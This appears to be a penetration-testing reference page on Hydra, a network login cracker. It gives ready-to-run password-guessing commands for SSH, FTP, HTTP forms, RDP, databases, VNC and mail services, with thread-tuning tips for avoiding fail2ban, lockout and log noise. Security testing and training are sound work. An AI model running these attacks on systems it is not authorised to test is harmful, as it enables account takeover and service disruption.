# Hydra

Hydra is one of the most widely used network login crackers in penetration testing. Its core advantage is parallelisation: rather than testing one credential pair at a time, it opens multiple connections simultaneously, making it significantly faster than sequential approaches against services with no rate limiting.

***

## Command Structure

Every Hydra command follows the same four-part structure:

```bash
hydra [login_options] [password_options] [attack_options] [service_options]
```

| Parameter | Purpose | Example |
|---------|---------|---------|
| `-l` / `-L` | Single username or username file | `-l admin` or `-L users.txt` |
| `-p` / `-P` | Single password or password file | `-p pass123` or `-P rockyou.txt` |
| `-t` | Number of parallel threads | `-t 16` |
| `-f` | Stop after first valid login found | `-f` |
| `-s` | Non-standard port | `-s 2222` |
| `-V` | Verbose: show every attempt | `-V` |
| `-v` | Less verbose, show hits only | `-v` |
| `-M` | Target list file (multiple hosts) | `-M targets.txt` |
| `-x` | Brute force mask generation | `-x 6:8:aA1` |

***

## Service-Specific Usage

### SSH

```bash
# Single username, password list
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100 -t 4

# Multiple targets from file
hydra -l root -p toor -M targets.txt ssh
```

Keep threads low on SSH (`-t 4`). SSH handshakes are computationally expensive and high thread counts will either trigger fail2ban or simply slow down due to server-side resource exhaustion.

### FTP

```bash
# Standard port
hydra -L usernames.txt -P passwords.txt ftp://192.168.1.100

# Non-standard port with verbose output
hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
```

### HTTP Basic Authentication

```bash
hydra -L usernames.txt -P passwords.txt www.example.com http-get
```

HTTP basic authentication sends credentials as a Base64-encoded `Authorization` header. Hydra's `http-get` module handles the encoding automatically.

### Web Login Forms (POST)

Web form brute forcing is the most syntax-sensitive use case. The `http-post-form` string has three colon-separated components:

```bash
hydra -l admin -P passwords.txt www.example.com \
  http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
```

The three-part string structure:

```
"/path:POST_body:success_or_failure_condition"
```

- `/login` is the form action URL
- `user=^USER^&pass=^PASS^` are the parameter names with Hydra placeholders
- `F=incorrect` means fail if the word "incorrect" appears in the response (use `S=` to match a success string instead)

Using `S=302` as the condition checks for a redirect on successful login, which is the standard behaviour of many web apps after authentication:

```bash
hydra -l admin -P passwords.txt www.example.com \
  http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

### RDP

```bash
hydra -l administrator -P passwords.txt rdp://192.168.1.100 -t 4
```

### Other Common Services

```bash
# MySQL
hydra -l root -P passwords.txt mysql://192.168.1.100

# VNC (password only, no username)
hydra -P passwords.txt vnc://192.168.1.100

# SMTP
hydra -l user@example.com -P passwords.txt smtp://mail.server.com

# POP3 / IMAP
hydra -l user@example.com -P passwords.txt pop3://mail.server.com
hydra -l user@example.com -P passwords.txt imap://mail.server.com
```

***

## Brute Force Mode with `-x`

The `-x` flag enables Hydra's built-in password generation without a wordlist, following the pattern `-x min:max:charset`:

```bash
# Generate all 6-8 character passwords using lower, upper, and digits
hydra -l administrator \
  -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 \
  192.168.1.100 rdp
```

This is pure brute force and should be reserved for offline scenarios or targets with no lockout policy and a known short password length. Against a standard RDP service with lockout enabled, this would lock the account almost immediately.

***

## Practical Thread Recommendations

Thread count is the most important operational tuning parameter. Too high and you get blocked or cause service disruption; too low and the scan takes impractically long.

| Service | Recommended Threads | Reason |
|--------|-------------------|--------|
| SSH | 4 | Handshake overhead, lockout risk |
| FTP | 10-15 | Lightweight protocol |
| HTTP basic | 20-40 | Fast, stateless |
| HTTP forms | 10-20 | Session handling overhead |
| RDP | 4 | Protocol overhead, lockout risk |
| MySQL/MSSQL | 8-10 | Connection overhead |
| VNC | 4-8 | Connection state management |

The `-f` flag is worth including on every scan. Once valid credentials are found there is no reason to continue generating noise in server logs and risking account lockout on adjacent attempts.
